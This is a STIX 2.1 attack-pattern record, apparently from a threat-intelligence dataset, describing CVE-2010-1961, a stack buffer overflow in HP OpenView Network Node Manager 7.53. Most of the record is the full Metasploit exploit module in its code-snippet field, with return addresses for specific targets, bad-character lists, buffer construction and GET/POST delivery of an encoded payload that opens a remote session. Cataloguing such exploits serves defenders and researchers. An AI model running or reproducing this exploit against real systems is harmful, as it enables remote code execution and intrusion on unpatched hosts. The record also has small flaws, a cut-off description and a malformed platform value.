{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a70523e6-646c-4fa9-b0d5-ea6eb0a9605c",
    "created": "2024-08-14T16:55:11.953247Z",
    "modified": "2024-08-14T16:55:11.953251Z",
    "name": "HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.  This vulnerability is triggerable via either a GET or POST request. It is interesting to note that this vulnerability cannot be exploited by overwriting SEH, since attempting",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_ovwebsnmpsrv_ovutil.rb",
            "external_id": "hp_nnm_ovwebsnmpsrv_ovutil.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1961"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02217439"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/jovgraph.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53\n        prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'\n        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.\n\n        This vulnerability is triggerable via either a GET or POST request. It is interesting to\n        note that this vulnerability cannot be exploited by overwriting SEH, since attempting\n        to would trigger CVE-2010-1964.\n\n        The vulnerable code is within a sub-function called from \"main\" within \"ovwebsnmpsrv.exe\"\n        with a timestamp prior to April 7th, 2010. This function contains a 256 byte stack buffer\n        which is passed to the \"getProxiedStorageAddress\" function within ovutil.dll. When\n        processing the address results in an error, the buffer is overflowed in a call to sprintf_new.\n        There are no stack cookies present, so exploitation is easily achieved by overwriting the\n        saved return address.\n\n        There exists some unreliability when running this exploit. It is not completely clear why\n        at this time, but may be related to OVWDB or session management. Also, on some attempts\n        OV NNM may report invalid characters in the URL. It is not clear what is causing this\n        either.\n      } ,\n      'Author'         =>\n        [\n          'jduck'   # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1961' ],\n          [ 'OSVDB', '65428' ],\n          [ 'BID', '40638' ],\n          [ 'ZDI', '10-106' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02217439' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 512, # 256 byte buffer..\n          # In addition to regular HTTP type bad chars, this one also has\n          # an issue with \" since the buffer is being passed on the command line.\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x22\\x24\\x2c\\x3b\\x60\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53 w/NNM_01201',\n            {\n              'PopPopRet' => 0x5a02aadf, # pop edx/pop ebp/ret - in ov.dll (v1.30.10.9166)\n              'JmpEsp' => 0x5a219880,    # jmp esp - in ovsnmp.dll (v1.30.10.9166)\n            }\n          ],\n          [ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',\n            {\n              'PopPopRet' => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959\n              'JmpEsp' => 0x5a219880,    # jmp esp - in ovsnmp.dll (v1.30.10.9166)\n            }\n          ],\n          [ 'Debug Target',\n            {\n              'PopPopRet' => 0xdeadbeef, # crasher\n              'JmpEsp' => 0xbeefcafe\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-06-16'))\n  end\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    cgi = '/OvCgi/jovgraph.exe'\n\n    # Any command line parameter will cause a buffer overflow.\n\n    # \"action\" must be set\n    action = rand_text_alphanumeric(1)\n\n    # \"sel\" must be set\n    sel = rand_text_alphanumeric(1)\n\n    # \"timestamp\" cannot be set.\n\n    start = 'No entry for '\n\n    ret_offset = 256 + 4 + 12 + 4\n\n    # Create the buffer\n    buf = ''\n    buf << rand_text(ret_offset - start.length)\n    buf << [target['PopPopRet']].pack('V')\n    buf << [0x5a400141].pack('V') # ptr to zero\n    buf << [0x5a459fdc].pack('V') # ptr to writable scratch\n    buf << [target['JmpEsp']].pack('V')\n    #buf << \"\\xcc\"\n    buf << payload.encoded\n\n    # Ugh, triggers cve-2010-1964\n    #buf = pattern_create(1456)\n\n    # Send the request\n    if rand(2) > 0\n      print_status(\"Sending exploit via POST request...\")\n      res = send_request_cgi({\n        'uri'\t\t  => cgi,\n        'method'\t  => \"POST\",\n        'vars_post' =>\n          {\n            'sel' => sel,\n            'act' => action,\n            'arg' => buf\n          }\n      }, 3)\n    else\n      print_status(\"Sending exploit via GET request...\")\n      res = send_request_cgi({\n        'uri'\t\t  => cgi,\n        'method'\t  => \"GET\",\n        'vars_get' =>\n          {\n            'sel' => sel,\n            'act' => action,\n            'arg' => buf\n          }\n      }, 3)\n    end\n\n    if not res\n      fail_with(Failure::Unknown, \"Eek! We didn't get a response.. Exploiting this vuln should return one!\")\n    end\n\n    print_status(res.body) if datastore[\"NNM_DEBUG\"]\n\n    if res.body =~ /graphing applet is being/\n      print_status(\"We got the body we were looking for, the session should be coming any second.\")\n    else\n      fail_with(Failure::Unknown, \"Eek, exploit likely failed. The body didn't contain what we expected.\")\n    end\n\n    handler\n\n  end\n\n  def wfs_delay\n    5\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-06-16",
    "x_mitre_platforms": [
        "win'"
    ]
}